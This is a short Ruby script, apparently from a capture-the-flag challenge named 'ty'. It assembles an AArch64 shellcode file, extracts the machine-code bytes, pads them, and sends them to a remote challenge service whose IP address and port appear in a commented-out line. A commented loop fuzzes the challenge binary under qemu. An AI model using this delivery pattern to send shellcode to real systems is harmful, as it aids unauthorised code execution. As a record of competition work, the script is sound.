require 'socket'

asm = ARGV[0] || 'ty.S'

#out = TCPSocket.new('210.71.253.109', 9123)
out = STDOUT

system("LD_LIBRARY_PATH=/usr/lib/aarch64/usr/lib ./aarch64/usr/bin/aarch64-linux-gnu-as #{asm}")

o = ''
`aarch64-linux-gnu-objdump -S a.out`.each_line do |line|
  if line =~ /411[0-9a-f]{3}:\s+([0-9a-f]{8})/
    o << [$1.hex].pack('V')
  end
end

while o.size < 220
  o << "\0"
end

out.print "#{o.size}" + "\0" * 5
out.print o
out.print "\0" * o.size

if out != STDOUT
  out.close_write
  puts out.read
end

#puts 123
#print ' ' * 123

#puts 999

# 1.upto(1000) do |i|
#   print i, " "
#   system("echo #{i} | aarch64/usr/bin/qemu-aarch64-static ./ty-b83f0d0edeb8cfad76d30eddc58da139 2>&1")
#   #pipe = IO.popen('aarch64/usr/bin/qemu-aarch64-static ./ty-b83f0d0edeb8cfad76d30eddc58da139 2>&1', 'r+')
#   #pipe.puts(i)
#   #pipe.close_write
#   #print i, " ", pipe.read
#   #puts
#   #STDOUT.flush
# end
